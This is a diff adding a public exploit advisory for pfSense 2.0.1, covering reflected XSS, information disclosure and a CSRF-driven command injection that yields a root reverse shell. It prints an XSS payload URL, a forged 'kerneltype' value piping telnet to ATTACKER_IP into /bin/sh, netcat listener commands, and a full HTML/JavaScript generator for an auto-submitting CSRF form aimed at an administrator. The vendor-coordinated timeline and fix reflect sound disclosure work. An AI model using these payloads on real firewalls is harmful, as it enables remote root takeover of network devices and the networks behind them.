@@ -1,0 +1,206 @@
+######################################################################
+# Exploit Title: pfSense 2.0.1 XSS & CSRF Remote root Access
+# Date: 04/01/2013
+# Author: Yann CAM @ Synetis
+# Vendor or Software Link: www.pfsense.org
+# Version: 2.0.1
+# Category: XSS & CSRF Remote root Access
+# Google dork:
+# Tested on: FreeBSD
+######################################################################
+
+
+
+pfSense firewall/router distribution description :
+======================================================================
+
+pfSense is a free, open source customized distribution of FreeBSD tailored for use as a firewall and router. In addition to being a powerful, flexible firewalling and routing platform, it includes a long list of related features and a package system allowing further expandability without adding bloat and potential security vulnerabilities to the base distribution. pfSense is a popular project with more than 1 million downloads since its inception, and proven in countless installations ranging from small home networks protecting a PC and an Xbox to large corporations, universities and other organizations protecting thousands of network devices. 
+
+This project started in 2004 as a fork of the m0n0wall project, but focused towards full PC installations rather than the embedded hardware focus of m0n0wall. pfSense also offers an embedded image for Compact Flash based installations, however it is not our primary focus.
+
+In version 2.0.1 of the distribution, differents vulnerabilities XSS & CSRF RCE reverse root shell can be used. It is strongly advised to update to version 2.0.2 available now.
+
+
+
+Proof of Concept 1 :
+======================================================================
+
+Potential XSS protected with CSRFMagic with information disclosure :
+
+File /usr/local/www/progress.php lines 21-30 :
+  $X = upload_progress_meter_get_info( $_GET["UPLOAD_IDENTIFIER"] );
+  if (!$X) {
+ 
+    if ( array_key_exists( "e", $_GET ) ) {
+       echo "<HTML><BODY onLoad='window.close();'>" . gettext("Invalid Meter ID") . "! {$_GET["UPLOAD_IDENTIFIER"]}";
+       echo ('</BODY></HTML>');
+     }else{
+       echo ('<HTML><meta HTTP-EQUIV="Refresh" CONTENT="1; url='. $url .'"><BODY></BODY></HTML>');
+     }
+     exit;
+
+Result with a direct call to this page :
+
+Fatal error: Call to undefined function upload_progress_meter_get_info() in /usr/local/www/progress.php on line 21
+
+
+
+Proof of Concept 2 :
+======================================================================
+
+XSS non-persistent :
+
+File /usr/local/www/pkg_mgr_install.php line 166 :
+      update_output_window(sprintf(gettext("Could not find %s."), $_GET['pkg']));
+
+PoC :
+  http://pfsense_url/pkg_mgr_install.php?mode=installedinfo&pkg=x%22;alert(document.cookie);this.document.forms[0].output.value+=%22
+
+
+
+Proof of Concept 3 :
+======================================================================
+
+CSRF exploit to Remote Command Execution in root context :
+
+File /usr/local/www/system_firware.php line 118 (because this script isn't protected with CSRFMagic) :
+  if($_POST['kerneltype']) {
+     if($_POST['kerneltype'] == "single")
+       system("touch /boot/kernel/pfsense_kernel.txt");
+     else
+       system("echo {$_POST['kerneltype']} > /boot/kernel/pfsense_kernel.txt"); // vulnerability here
+  }
+
+It's the more dangerous vulnerability. By this way, it's possible to an attacker to gain a full interactive reverse shell through a CSRF attack.
+
+Default valid command :
+  echo SMP > /boot/kernel/pfsense_kernel.txt
+
+Forged $_POST['kerneltype'] variable for RCE command to generate :
+  SMP > /boot/kernel/pfsense_kernel.txt;telnet ATTACKER_IP 1337 | /bin/sh | telnet ATTACKER_IP 1338
+
+Attacker need to put two netcat in listen mode on his computer :
+  nc -l -vv -p 1337 # to send command
+  nc -l -vv -p 1338 # to read results
+
+You can see this exploitation in this demonstration video just made as proof of concept here:
+  http://www.youtube.com/watch?feature=player_embedded&v=qnmalMrrUF4
+
+CSRF generator to Reverse root shell :
+
+<html>
+  <head>
+    <script>
+function trim(s){
+  return s.replace(/\r\n|\r|\n|\t/g,'').replace(/^\s+/g,'').replace(/\s+$/g,'');
+}
+ 
+function generateCSRF(){
+  var target = trim(document.getElementById("target").value);
+  var attacker = trim(document.getElementById("attacker").value);
+  var sendport = trim(document.getElementById("sendport").value);
+   var readport = trim(document.getElementById("readport").value);
+  var resultjs = "";
+  resultjs += "<html><body><form name='x' action='" + target + "system_firmware.php' method='post'>";
+  resultjs += "<input type='hidden' name='kerneltype' value='SMP > /boot/kernel/pfsense_kernel.txt;telnet " + attacker + " " + sendport + " | /bin/sh | telnet " + attacker + " " + readport + "' />";
+  resultjs += "</form><script>document.forms['x'].submit();<\/script></body></html>";
+  document.getElementById("resultjs").value = resultjs;
+}
+ 
+    </script>
+  </head>
+   <body onload="generateCSRF();">
+     <h2>CSRF pfSense 2.0.1 to root RCE (reverse shell)</h2>
+     <p>pfSense 2.0.1, the latest firewall/router distribution based on FreeBSD is vulnerable to a CSRF attack that allows gaining root access through a reverse shell.<br />
+ The attacker must know the URL address of pfsense WebGui.<br />
+ To obtain the reverseshell, attacker must place two netcat in listening mode on two different ports. One will be used to send commands and the other for receiving results.<br />
+ On attacker machine :
+       <pre>nc -l -vv -p 1337 # First netcat listener, to enter shell command.</pre>
+       <pre>nc -l -vv -p 1338 # Second netcat listener, to receive commands results.</pre>
+ (admin hash is in the /config/config.xml file on pfSense)
+     </p>
+ <form action="" onsubmit="generateCSRF();return false;">
+   <table>
+     <tr><td>URL's pfSense 2.0.1 Targeted :</td> <td>
+       <input id="target" type="text" value="http://192.168.0.254:80/" size="70" onkeyup="generateCSRF();" /></td>
+     </tr>
+     <tr><td>Attacker IP (reverse shell) :</td> <td>
+       <input id="attacker" type="text" value="192.168.0.141" size="70" onkeyup="generateCSRF();" /></td>
+     </tr>
+     <tr><td>Attacker binded port to send commands :</td> <td>
+       <input id="sendport" type="text" value="1337" size="70" onkeyup="generateCSRF();" /></td>
+     </tr>
+     <tr><td>Attacker binded port to read results :</td> <td>
+       <input id="readport" type="text" value="1338" size="70" onkeyup="generateCSRF();" /></td>
+     </tr>
+ 
+    <tr> <td>CSRF exploit to send to an admin : </td> <td>
+      <textarea cols="70" rows="10" id="resultjs" readonly="readonly">&lt;/textarea&gt; </td>
+     </tr>
+   </table>
+ </form>
+ </body>
+</html>
+
+
+Solution:
+======================================================================
+2012-12-21:  Release 2.0.2
+
+
+
+
+Additional resources :
+======================================================================
+
+- www.pfsense.org
+- www.synetis.com
+- www.synetis.com/2012/11/12/contribution-au-pare-feu-routeur-pfsense
+- www.asafety.fr/vuln-exploit-poc/xss-csrf-rce-pfsense-2-0-1-remote-root-access
+- www.youtube.com/watch?feature=player_embedded&v=qnmalMrrUF4
+- github.com/bsdperimeter/pfsense/commit/73b9d3c60a337ab0fe979958990a717288844ddd
+- github.com/bsdperimeter/pfsense/commit/33ba41314b5e78c16562365826aef9118f370e46
+
+
+
+Report timeline :
+======================================================================
+
+2012-10-02 : Team alerted with many details, PoC, video and potential solution
+2012-10-04 : Team response with correction links into git repository
+2012-10-05 : Our feedback concerning their corrections
+2012-12-10 : Answer about the next release date of the 2.0.2 (no response)
+2012-12-21 : Release 2.0.2
+2013-01-04 : Public advisory
+
+
+
+Credits :
+======================================================================
+
+    88888888
+   88      888                                         88    88
+  888       88                                         88
+  788           Z88      88  88.888888     8888888   888888  88    8888888.
+   888888.       88     88   888    Z88   88     88    88    88   88     88
+       8888888    88    88   88      88  88       88   88    88   888
+            888   88   88    88      88  88888888888   88    88     888888
+  88         88    88  8.    88      88  88            88    88          888
+  888       ,88     8I88     88      88   88      88   88    88  .88     .88
+   ?8888888888.     888      88      88    88888888    8888  88   =88888888
+       888.          88
+                    88    www.synetis.com
+                 8888  Consulting firm in management and information security
+
+Yann CAM - Security Consultant @ synetis
+
+
+
+Last word :
+======================================================================
+
+Thank you to all the pfSense team for professionalism and quality solution despite of these few minor weaknesses.
+
+-- 
+SYNETIS
+CONTACT: www.synetis.com
